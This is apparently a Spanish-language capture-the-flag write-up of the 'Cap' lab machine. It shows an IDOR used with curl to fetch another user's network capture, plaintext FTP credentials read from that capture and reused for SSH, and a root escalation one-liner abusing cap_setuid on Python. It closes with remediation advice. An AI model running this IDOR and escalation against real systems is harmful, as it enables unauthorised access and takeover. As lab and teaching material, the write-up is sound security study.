Resumen

Cap es una cadena corta y muy didáctica: un IDOR en el panel web permite descargar la captura de red de otro usuario, dentro hay credenciales en claro, y la escalada es una capability mal puesta sobre Python que da root en una línea.

Vulnerabilidad

IDOR / Broken Access Control

El panel descarga capturas de red por un identificador numérico en la URL (/data/&lt;id&gt;) sin comprobar de quién es cada captura. Cambiando el id a 0 accedemos a la captura de otro usuario, que contiene tráfico sensible.

Capability cap_setuid en Python

El binario de Python tiene asignada la capability cap_setuid+ep. Eso le permite cambiar su UID a 0 sin ser root, de modo que cualquiera que pueda ejecutarlo puede lanzar un intérprete como root.

Un 21 (FTP), un 22 (SSH) y un 80 sirviendo un panel web (Security Dashboard) sobre gunicorn.

Enumeración

El panel tiene una sección de capturas en /data/&lt;id&gt;. La nuestra es /data/1, pero probamos a bajar el identificador

┌──(jaime㉿kali)-[~]└─$ curl http://cap/data/0 -o 0.pcap

La captura 0.pcap es de otra sesión. La abrimos y, siguiendo el flujo de FTP, aparecen las credenciales en claro

USER nathan PASS Buck3tH4TF0RM3!

Credenciales: nathan / Buck3tH4TF0RM3!

Explotación

Las credenciales valen para SSH, así que entramos directamente

┌──(jaime㉿kali)-[~]└─$ ssh nathan@cap
nathan@cap:~$ whoami nathan

Ya tenemos un usuario del sistema; leemos la flag de usuario y pasamos a la escalada.

Escalada de privilegios

Lo primero al conseguir un usuario: revisar capabilities del sistema

nathan@cap:~$ getcap -r / 2>/dev/null /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

Python tiene cap_setuid, así que puede cambiar su UID a 0. Lo aprovechamos para abrir una shell como root

nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")' root@cap:~# whoami root

Flags

┌──(jaime㉿kali)-[~]└─$ cat /home/nathan/user.txt
┌──(jaime㉿kali)-[~]└─$ cat /root/root.txt

Cómo se arregla

La cadena nace de un control de acceso ausente y de una capability peligrosa, así que el arreglo va por capas:

  • Corregir el IDOR: cada usuario solo debe poder acceder a sus propias capturas; validar en el servidor la propiedad del recurso antes de servirlo, no fiarse del identificador de la URL.
  • No transmitir credenciales en claro: el FTP sin cifrar deja las contraseñas a la vista en cualquier captura; usar FTPS/SFTP.
  • Quitar la capability de Python: cap_setuid sobre un intérprete equivale a dar root. Eliminarla con setcap y no asignar capabilities a binarios de propósito general.
  • No reutilizar credenciales: la misma contraseña del FTP abría el SSH; conviene separar credenciales por servicio.

Conclusiones

Un IDOR tan simple como cambiar un número en la URL puede exponer datos de otros usuarios; nunca hay que confiar el control de acceso al identificador que manda el cliente.

Las capturas de red son una mina: si capturan tráfico de protocolos en claro como FTP, regalan credenciales directamente.

Las capabilities de Linux son escalada silenciosa. Tras conseguir un usuario, un getcap -r / revela en segundos si algún binario, como Python, puede convertirse en root.
